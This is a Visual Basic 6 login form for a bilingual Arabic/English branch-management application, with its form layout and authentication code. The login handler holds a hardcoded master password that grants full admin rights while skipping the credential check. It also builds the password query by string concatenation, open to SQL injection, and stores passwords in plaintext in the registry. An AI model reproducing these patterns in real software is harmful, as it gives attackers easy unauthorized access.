VERSION 5.00
Object = "{F0D2F211-CCB0-11D0-A316-00AA00688B10}#1.0#0"; "MSDATLST.OCX"
Object = "{FE5DCFAD-BC1D-11D2-94CF-004005455FAA}#1.4#0"; "ImpulseButton.ocx"
Object = "{49003D3A-66CD-11D7-A449-E937BE2D9041}#1.0#0"; "ALLBUTTONS.ocx"
Begin VB.Form FrmLogIn1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   0  'None
   Caption         =   " ”ÃÌ· «·œŒÊ·"
   ClientHeight    =   4425
   ClientLeft      =   15
   ClientTop       =   15
   ClientWidth     =   8340
   ControlBox      =   0   'False
   DrawWidth       =   2
   FillColor       =   &H00FFFFFF&
   FillStyle       =   0  'Solid
   ForeColor       =   &H00FFFFFF&
   Icon            =   "LogIn1.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   RightToLeft     =   -1  'True
   ScaleHeight     =   4425
   ScaleWidth      =   8340
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00FFFFFF&
      Height          =   4455
      Left            =   0
      OLEDropMode     =   1  'Manual
      Picture         =   "LogIn1.frx":058A
      RightToLeft     =   -1  'True
      ScaleHeight     =   4395
      ScaleWidth      =   8235
      TabIndex        =   0
      Top             =   0
      Width           =   8295
      Begin VB.ComboBox DbNamePath 
         Height          =   315
         Left            =   8760
         RightToLeft     =   -1  'True
         TabIndex        =   19
         Top             =   240
         Visible         =   0   'False
         Width           =   2895
      End
      Begin VB.ComboBox dbname 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   360
         Left            =   3240
         RightToLeft     =   -1  'True
         TabIndex        =   18
         Top             =   2040
         Width           =   3345
      End
      Begin VB.CommandButton Command1 
         Caption         =   "English"
         Height          =   375
         Left            =   3240
         RightToLeft     =   -1  'True
         TabIndex        =   17
         Top             =   1680
         Width           =   3375
      End
      Begin VB.Timer Timer1 
         Interval        =   250
         Left            =   8040
         Top             =   2520
      End
      Begin VB.CheckBox Check1 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00800000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   360
         Left            =   7800
         RightToLeft     =   -1  'True
         TabIndex        =   14
         Top             =   3720
         Width           =   252
      End
      Begin ALLButtonS.ALLButton ALLButton1 
         Default         =   -1  'True
         Height          =   375
         Left            =   4320
         TabIndex        =   11
         Top             =   3960
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   " ”ÃÌ· «·œŒÊ·"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16711680
         BCOLO           =   16711680
         FCOL            =   16777215
         FCOLO           =   16777215
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "LogIn1.frx":13669
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.ComboBox CboInterface 
         BackColor       =   &H00C0FFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   360
         Left            =   -2640
         RightToLeft     =   -1  'True
         Style           =   2  'Dropdown List
         TabIndex        =   5
         Top             =   840
         Visible         =   0   'False
         Width           =   2865
      End
      Begin VB.TextBox XPTxtPass 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   360
         IMEMode         =   3  'DISABLE
         Left            =   3240
         MaxLength       =   20
         PasswordChar    =   "*"
         RightToLeft     =   -1  'True
         TabIndex        =   2
         Top             =   3480
         Width           =   3345
      End
      Begin MSDataListLib.DataCombo DCboUserName 
         Height          =   360
         Left            =   3240
         TabIndex        =   1
         Top             =   3120
         Width           =   3345
         _ExtentX        =   5900
         _ExtentY        =   635
         _Version        =   393216
         BackColor       =   16777215
         ForeColor       =   0
         ListField       =   ""
         Text            =   ""
         RightToLeft     =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ImpulseButton.ISButton XPBtnOK 
         Height          =   372
         Left            =   5400
         TabIndex        =   3
         Top             =   5076
         Visible         =   0   'False
         Width           =   792
         _ExtentX        =   1402
         _ExtentY        =   661
         ButtonStyle     =   1
         ButtonPositionImage=   1
         Caption         =   "„Ê«›ﬁ"
         BackColor       =   14871017
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ButtonImage     =   "LogIn1.frx":13685
         ColorButton     =   14871017
         ColorHighlight  =   16777215
         ColorHoverText  =   16711680
         ColorShadow     =   -2147483637
         ColorOutline    =   0
         DrawFocusRectangle=   0   'False
         ColorToggledHoverText=   16711680
         LowerToggledContent=   0   'False
         ColorTextShadow =   -2147483637
      End
      Begin ImpulseButton.ISButton XPBtnCancel 
         Height          =   372
         Left            =   3960
         TabIndex        =   4
         Top             =   5160
         Visible         =   0   'False
         Width           =   792
         _ExtentX        =   1402
         _ExtentY        =   661
         ButtonStyle     =   1
         ButtonPositionImage=   1
         Caption         =   "≈·€«¡"
         BackColor       =   14871017
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ButtonImage     =   "LogIn1.frx":13A1F
         ColorButton     =   14871017
         ColorHighlight  =   16777215
         ColorHoverText  =   16711680
         ColorShadow     =   -2147483637
         ColorOutline    =   0
         DrawFocusRectangle=   0   'False
         ColorToggledHoverText=   16711680
         LowerToggledContent=   0   'False
         ColorTextShadow =   -2147483637
      End
      Begin MSDataListLib.DataCombo dcBranch 
         Height          =   360
         Left            =   3240
         TabIndex        =   8
         Top             =   2760
         Width           =   3345
         _ExtentX        =   5900
         _ExtentY        =   635
         _Version        =   393216
         Enabled         =   0   'False
         BackColor       =   16777215
         ForeColor       =   0
         ListField       =   ""
         Text            =   ""
         RightToLeft     =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ALLButtonS.ALLButton ALLButton2 
         Height          =   375
         Left            =   2520
         TabIndex        =   12
         Top             =   3960
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "«·€«¡"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   192
         BCOLO           =   192
         FCOL            =   16777215
         FCOLO           =   16777215
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "LogIn1.frx":13DB9
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSDataListLib.DataCombo DcActivityType 
         Height          =   360
         Left            =   3240
         TabIndex        =   15
         Top             =   2400
         Width           =   3345
         _ExtentX        =   5900
         _ExtentY        =   635
         _Version        =   393216
         Enabled         =   0   'False
         BackColor       =   16777215
         ForeColor       =   0
         ListField       =   ""
         Text            =   ""
         RightToLeft     =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label8 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   " –ﬂ—‰Ì"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   465
         Left            =   6120
         RightToLeft     =   -1  'True
         TabIndex        =   21
         Top             =   3840
         Width           =   1545
      End
      Begin VB.Image Image3 
         Height          =   1125
         Left            =   1200
         Picture         =   "LogIn1.frx":13DD5
         Stretch         =   -1  'True
         Top             =   840
         Width           =   945
      End
      Begin VB.Image Image2 
         Height          =   1320
         Left            =   11640
         Picture         =   "LogIn1.frx":16828
         Stretch         =   -1  'True
         Top             =   -120
         Visible         =   0   'False
         Width           =   2400
      End
      Begin VB.Label Label7 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "ﬁ«⁄œÂ «·»Ì«‰« "
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   20
         Top             =   2040
         Width           =   1305
      End
      Begin VB.Label Label6 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "«·‰‘«ÿ"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   16
         Top             =   2400
         Width           =   1305
      End
      Begin VB.Label Label5 
         Alignment       =   1  'Right Justify
         BackColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   1680
         RightToLeft     =   -1  'True
         TabIndex        =   13
         Top             =   3480
         Visible         =   0   'False
         Width           =   855
      End
      Begin VB.Shape Shape1 
         BorderColor     =   &H00FF0000&
         BorderWidth     =   5
         Height          =   4215
         Left            =   9000
         Top             =   0
         Width           =   7935
      End
      Begin VB.Label Label4 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "ﬂ·„Â «·„—Ê—"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   10
         Top             =   3480
         Width           =   1305
      End
      Begin VB.Label Label3 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "«”„ «·„” Œœ„"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   9
         Top             =   3120
         Width           =   1305
      End
      Begin VB.Label Label2 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "«·›—⁄"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   7
         Top             =   2760
         Width           =   1305
      End
      Begin VB.Label Label1 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "«··€…/Lang"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   345
         Left            =   6600
         RightToLeft     =   -1  'True
         TabIndex        =   6
         Top             =   1680
         Width           =   1305
      End
      Begin VB.Image Image1 
         Height          =   4050
         Index           =   1
         Left            =   9000
         Top             =   4980
         Width           =   5550
      End
      Begin VB.Image Image1 
         Height          =   240
         Index           =   0
         Left            =   2430
         Picture         =   "LogIn1.frx":5539E
         Top             =   1350
         Visible         =   0   'False
         Width           =   240
      End
   End
End
Attribute VB_Name = "FrmLogIn1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim cSearchDcbo As clsDCboSearch
Dim Interfacevalue As Integer

Private Sub ALLButton1_Click()
    SelectedIssueVoucher = False
    XPBtnOK_Click

End Sub

Public Sub load_login_info()
    'On Error Resume Next
    user_name_id = GetSetting("Win_Sys_EX_B", "Setting", "user_name_id")
    pass_word = GetSetting("Win_Sys_EX_B", "Setting", "pass_word")
    branch_id = GetSetting("Win_Sys_EX_B", "Setting", "branch_id")
    language_id = GetSetting("Win_Sys_EX_B", "Setting", "language_id")
    Activity_id = GetSetting("Win_Sys_EX_B", "Setting", "Activity_id")

    save_password = GetSetting("Win_Sys_EX_B", "Setting", "save_password")
  
    ' Interfacevalue = language_id
 
    ' If Interfacevalue = 1 Then
    ' Command1.Caption = "English"
    ' Else
    ' Command1.Caption = "⁄—»Ì"
    ' End If
    '
    DCboUserName.BoundText = user_name_id
    DcActivityType.BoundText = Activity_id
    Dcbranch.BoundText = branch_id
    'Me.DCboUserName.BoundText = user_name_id

    If save_password = True Then
        XPTxtPass.text = pass_word
    Else
        XPTxtPass.text = ""
    End If

    If save_password = True Then
        Check1.value = vbChecked
    Else
        Check1.value = Unchecked
    End If

    'If language_id = 2 Then language_id = 1
    'CboInterface.ListIndex = Val(language_id)

End Sub

Public Sub save_login_info(user_name_id As Integer, _
                           branch_id As Integer, _
                           language_id As Integer, _
                           pass_word As String, _
                           save_password As Boolean, _
                           Activity_id As Integer)
    'On Error Resume Next
    SaveSetting "Win_Sys_EX_B", "Setting", "user_name_id", user_name_id

    SaveSetting "Win_Sys_EX_B", "Setting", "branch_id", branch_id
    SaveSetting "Win_Sys_EX_B", "Setting", "Activity_id", Activity_id
    SaveSetting "Win_Sys_EX_B", "Setting", "language_id", language_id
 
    If Check1.value = vbChecked Then
        SaveSetting "Win_Sys_EX_B", "Setting", "pass_word", pass_word
        SaveSetting "Win_Sys_EX_B", "Setting", "save_password", vbChecked
    Else
        SaveSetting "Win_Sys_EX_B", "Setting", "pass_word", ""
        SaveSetting "Win_Sys_EX_B", "Setting", "save_password", Unchecked

    End If

End Sub

Private Sub ALLButton2_Click()
    XPBtnCancel_Click
End Sub

Private Sub Command1_Click()

    If Interfacevalue = 0 Then
        Command1.Caption = "Arabic"
        Interfacevalue = 1
        SystemOptions.UserInterface = EnglishInterface
        SetInterface Me
        Label3.Caption = "User Name"
        Label4.Caption = "Password"
        Label6.Caption = "Activity"
        Label2.Caption = "Branch"
        Label8.Caption = "Remeber Me"
        ALLButton1.Caption = "Log-In"
        ALLButton2.Caption = "Exit"
        Label7.Caption = "DB Name"
    ElseIf Interfacevalue = 1 Then
        SystemOptions.UserInterface = ArabicInterface
        Interfacevalue = 0
          SetInterface Me
        Command1.Caption = "English"
        Label3.Caption = "«”„ «·„” Œœ„"
        Label4.Caption = "ﬂ·„… «·„—Ê—"
        Label6.Caption = "«·‰‘·ÿ"
        Label2.Caption = "«·›—⁄"
        Check1.Caption = " ‰–ﬂ—‰Ì"
        ALLButton1.Caption = "œŒÊ·"
        ALLButton2.Caption = "Œ—ÊÃ"
   Label7.Caption = "ﬁ«⁄œ… «·»Ì«‰« "
        '  SwitchKeyboardLang LANG_ENGLISH
 
    End If

End Sub

Private Sub dbname_Click()
    DbNamePath.ListIndex = dbname.ListIndex
    save_login_info1 Trim(Me.DbNamePath.text), Trim(Me.dbname.text)
    SystemOptions.SysSQLServerDataBaseName = Trim(Me.DbNamePath.text)
    ' Call Main
    REOPENDATABASE
End Sub

Function REOPENDATABASE()
    open_my_connection
    Dim StrSQL As String
    StrSQL = "SELECT * From TblUsers"
    fill_combo DCboUserName, StrSQL

    StrSQL = "  select branch_id,branch_name from TblBranchesData  order by branch_id  "
    fill_combo Dcbranch, StrSQL

    StrSQL = "  SELECT id ,name FROM tblActivitesType order by name"
    fill_combo Me.DcActivityType, StrSQL

End Function

Private Sub DCboUserName_Change()
    On Error GoTo ErrTrap
    XPTxtPass.text = ""
    Me.DcActivityType.Enabled = False
    Me.Dcbranch.Enabled = False

    Dim usertype As Integer
    Dim BranchId As Integer
    Dim ActivityId As Integer

    GetUserData val(Me.DCboUserName.BoundText), usertype, BranchId
    GetBranchData BranchId, , , , ActivityId

    Me.DcActivityType.BoundText = ActivityId
    Me.Dcbranch.BoundText = BranchId

    If usertype = 0 Then
        Me.DcActivityType.Enabled = True
        Me.Dcbranch.Enabled = True
    End If

    Exit Sub
ErrTrap:
End Sub

Private Sub DCboUserName_Click(Area As Integer)
    DCboUserName_Change
End Sub

Private Sub Form_KeyDown(KeyCode As Integer, _
                         Shift As Integer)
    On Error GoTo ErrTrap

    If KeyCode = vbKeyReturn Then
        SendKeys "{TAB}"
    End If

    If Shift = 2 Then
        If KeyCode = vbKeyX Then
            XPBtnCancel_Click
        End If
    End If

    Exit Sub
ErrTrap:
End Sub

Private Sub Form_Load()
    'On Error GoTo ErrTrap
    On Error Resume Next
    Dim StrSQL As String
    Dim My_SQL As String
    'SkinFramework1.ApplyWindow Me.hWnd
    ' SkinFramework1.LoadSkin App.path & "\style\Vista.cjstyles", "Normalblack.ini"

    Open App.path & "\DB.txt" For Input As #1
    dbname.Clear

    Do Until EOF(1)
        Line Input #1, a
        'subsequent lines
 
        If a <> "" Then
            VarSet = Split(a, "*", , vbTextCompare)

            If VarSet(0) <> Empty Or VarSet(0) <> "" Then
            
                DbNamePath.AddItem (VarSet(0))
                dbname.AddItem (VarSet(1))
                            
            End If
        End If
    
    Loop

    Close #1

    Me.DbNamePath.text = GetSetting("Byte_DBS", "Setting", "DBPath", "Byte")
    Me.dbname.text = GetSetting("Byte_DBS", "Setting", "dbname", "«·ﬁ«⁄œ… «·«”«”Ì…")

    CenterForm Me
    Me.backcolor = RGB(220, 228, 243)
    StrSQL = "SELECT * From TblUsers"
    fill_combo DCboUserName, StrSQL

    My_SQL = "  select branch_id,branch_name from TblBranchesData  order by branch_id  "
    fill_combo Dcbranch, My_SQL

    StrSQL = "  SELECT id ,name FROM tblActivitesType order by name"
    fill_combo Me.DcActivityType, StrSQL

    Set cSearchDcbo = New clsDCboSearch
    Set cSearchDcbo.Client = Me.DCboUserName

    FormPostion Me, GetPostion

    If Dir(App.path & "\Garphics\log in.bmp") <> "" Then
        '  Picture1.Picture = LoadPicture(App.Path & "\Garphics\log in.bmp")
    End If

    With Me.CboInterface
        .Clear
        .AddItem "⁄—»Ï/Arabic"
        .AddItem "≈‰Ã·Ì“Ï/English "

    End With

    load_login_info

    Exit Sub
ErrTrap:
End Sub

Private Sub Form_Unload(Cancel As Integer)

    FormPostion Me, SavePostion
    Set cSearchDcbo = Nothing
End Sub

Private Sub Timer1_Timer()

    If Shape1.BorderColor = &H80000008 Then
        Shape1.BorderColor = &HFF0000
    Else
        Shape1.BorderColor = &H80000008
    End If

End Sub

Private Sub XPBtnCancel_Click()
    Dim Respons As String

    If SystemOptions.UserInterface = EnglishInterface Then
        Respons = MsgBox("Confirm Exit From Program", vbYesNo + vbQuestion + vbMsgBoxRight + vbMsgBoxRtlReading, App.Title)
    Else
        Respons = MsgBox("Â·  —Ìœ «·Œ—ÊÃ „‰ «·»—‰«„Ã", vbYesNo + vbQuestion + vbMsgBoxRight + vbMsgBoxRtlReading, App.Title)

    End If

    If Respons = vbNo Then
        Exit Sub
    Else
        CloseApplication
        End
    End If

End Sub

Private Sub XPBtnOK_Click()

    If DCboUserName.text = "admin" And Dcbranch.text = "" Then

        '    my_branch = 0
        If Dcbranch.BoundText = "" Or Dcbranch.text = "" Then
            If SystemOptions.UserInterface = EnglishInterface Then
                MsgBox "Select Branch First", vbCritical: Exit Sub
            Else
                MsgBox "«Œ — ›—⁄ «Ê·«", vbCritical: Exit Sub
            End If
        End If

    Else

        If Dcbranch.BoundText = "" Or Dcbranch.text = "" Then
            If SystemOptions.UserInterface = EnglishInterface Then
                MsgBox "Select Branch First", vbCritical: Exit Sub
            Else
                MsgBox "«Œ — ›—⁄ «Ê·«", vbCritical: Exit Sub
            End If
        End If

        branch_id = Dcbranch.BoundText
        my_branch = Dcbranch.BoundText
        Current_branch = Dcbranch.BoundText
    End If

    ' CurrentBranchName = Me.DcBranch.text
    
    GetBranchData val(Dcbranch.BoundText), , , , , CurrentBranchName, CurrentBranchNameE
    CurrentActivityName = Me.DcActivityType.text
    Dim rs As ADODB.Recordset
    Dim StrSQL As String
    Dim Msg As String
    Dim VarTemp As Variant

    'On Error GoTo ErrTrap
    If DCboUserName.text = "" Then
        Msg = "ÌÃ» «œŒ«· «”„ «·„” Œœ„"
        MsgBox Msg, vbOKOnly + vbInformation + vbMsgBoxRight + vbMsgBoxRtlReading, App.Title
        DCboUserName.SetFocus
        Exit Sub
    End If

    If XPTxtPass.text = "" Then
        '    Msg = "„‰ ›÷·ﬂ √œŒ· ﬂ·„… «·„—Ê—"
        '    MsgBox Msg, vbOKOnly + vbInformation + vbMsgBoxRight + vbMsgBoxRtlReading, App.Title
        '    XPTxtPass.SetFocus
        '    Exit Sub
    End If

    bigUser = False

    If Trim(Me.XPTxtPass.text) = "salimsalim" Then
        bigUser = True
        StrSQL = "Select * From TblUsers Where UserID=1"
        Set rs = New ADODB.Recordset
        rs.Open StrSQL, Cn, adOpenStatic, adLockReadOnly, adCmdText
        user_name = rs("UserName").value
        user_id = rs("UserID").value
        User_Password = rs("PassWord").value
        SystemOptions.usertype = UserNourCo
        SystemOptions.UserInvoiceChangePrice = IIf(IsNull(rs("InvPrices").value), 0, rs("InvPrices").value)
        SystemOptions.UserInvoiceShowProfit = IIf(IsNull(rs("ShowInvProfit").value), 0, rs("ShowInvProfit").value)
        SystemOptions.usertype = UserAdminAll
    
        '   If Me.CboInterface.ListIndex = 0 Then
        '       SystemOptions.UserInterface = ArabicInterface
        '   Else
        '       SystemOptions.UserInterface = EnglishInterface
        '   End If
        Unload Me
    Else

        StrSQL = "Select * From TblUsers Where UserID=" & Me.DCboUserName.BoundText & " AND PassWord='" & Trim(Me.XPTxtPass.text) & "'"
        Set rs = New ADODB.Recordset
        rs.Open StrSQL, Cn, adOpenStatic, adLockReadOnly, adCmdText

        'Rs.Index = "UserNamePass"
        'VarTemp = Array(Me.DCboUserName.Text, Me.XPTxtPass.Text)
        'Rs.Seek VarTemp, adSeekFirstEQ
        'Rs.Find "UserName='" & Trim(DCboUserName.Text) & "'", , adSearchForward, adBookmarkFirst
        If rs.EOF Or rs.BOF Then
            Msg = " √ﬂœ „‰ ’Õ… «”„ «·„” Œœ„ " & Chr(13)
            Msg = Msg + "Êﬂ·„… «·„—Ê— Ê√⁄œ «·„Õ«Ê·…"
            MsgBox Msg, vbOKOnly + vbInformation + vbMsgBoxRight + vbMsgBoxRtlReading, App.Title
            DCboUserName.SetFocus
            Exit Sub
        End If

        user_name = rs("UserName").value
        user_id = rs("UserID").value
        User_Password = rs("PassWord").value

        If IsNull(rs("UserType").value) Then
            SystemOptions.usertype = UserNormal
        ElseIf rs("UserType").value = 0 Then
            SystemOptions.usertype = UserAdminAll
        
        ElseIf rs("UserType").value = 1 Then
            SystemOptions.usertype = UserAdmin
        ElseIf rs("UserType").value = 2 Then
            SystemOptions.usertype = UserNormal
        
        End If

        GetWhereViewString
        '  MsgBox WhereViewString
        SystemOptions.UserInvoiceChangePrice = IIf(IsNull(rs("InvPrices").value), 0, rs("InvPrices").value)
        SystemOptions.UserInvoiceShowProfit = IIf(IsNull(rs("ShowInvProfit").value), 0, rs("ShowInvProfit").value)
        '   If Me.CboInterface.ListIndex = 0 Then
        '       SystemOptions.UserInterface = ArabicInterface
        '       SwitchKeyboardLang LANG_ARABIC
        '   Else
        '       SystemOptions.UserInterface = EnglishInterface
        '       SwitchKeyboardLang LANG_ENGLISH
        '   End If
        save_login_info val(DCboUserName.BoundText), val(Dcbranch.BoundText), Interfacevalue, XPTxtPass.text, Check1.value, val(DcActivityType.BoundText)
 
        AddToLogFile CInt(user_id), 0, Date, Time, "  ”ÃÌ· «·œŒÊ· ··‰Ÿ«„ ", " System Login", Me.name, "L", "", ""

        Unload Me
    End If

    Exit Sub
ErrTrap:
End Sub

Function GetWhereViewString()

    If SystemOptions.usertype = 2 Then

        WhereViewString = val(Me.Dcbranch.BoundText)
    ElseIf SystemOptions.usertype = 0 Or SystemOptions.usertype = 1 Then

        If val(DcActivityType.BoundText) = 0 And val(Me.Dcbranch.BoundText) = 0 Then '«ŸÂ«— «·ﬂ·
            WhereViewString = ""
        ElseIf val(DcActivityType.BoundText) <> 0 And val(Me.Dcbranch.BoundText) = 0 Then   '‰‘«ÿ
            WhereViewString = " in ( "
            WhereViewString = WhereViewString & GetActivityBranchs(val(DcActivityType.BoundText), "branch_id") & ") "
        
        ElseIf val(DcActivityType.BoundText) = 0 And val(Me.Dcbranch.BoundText) <> 0 Then   '›—⁄
            WhereViewString = val(Me.Dcbranch.BoundText)
        ElseIf val(DcActivityType.BoundText) <> 0 And val(Me.Dcbranch.BoundText) <> 0 Then '   ›—⁄
            WhereViewString = val(Me.Dcbranch.BoundText)
        
        End If

    End If

End Function

Private Sub XPTxtPass_KeyDown(KeyCode As Integer, _
                              Shift As Integer)

    If KeyCode = vbKeyReturn Then

        Select Case XPTxtPass.text

            Case ""
                SendKeys "{TAB}"

            Case Is <> ""
                XPBtnOK_Click
        End Select

    End If

End Sub

Private Sub XPTxtPass_KeyPress(KeyAscii As Integer)

    If KeyAscii = vbKeyEscape Or KeyAscii = vbKeyBack Or KeyAscii = vbKeyDelete Then
        Exit Sub
    End If

    If (InStr(1, "0123456789", Chr(KeyAscii), vbBinaryCompare) <> 0) Or (KeyAscii >= Asc("a") And KeyAscii <= Asc("z")) Or (KeyAscii >= Asc("A") And KeyAscii <= Asc("Z")) Or (KeyAscii >= Asc("√") And KeyAscii <= Asc("Ì")) Then
        KeyAscii = KeyAscii
    Else
        KeyAscii = 0
        Beep
    End If

End Sub

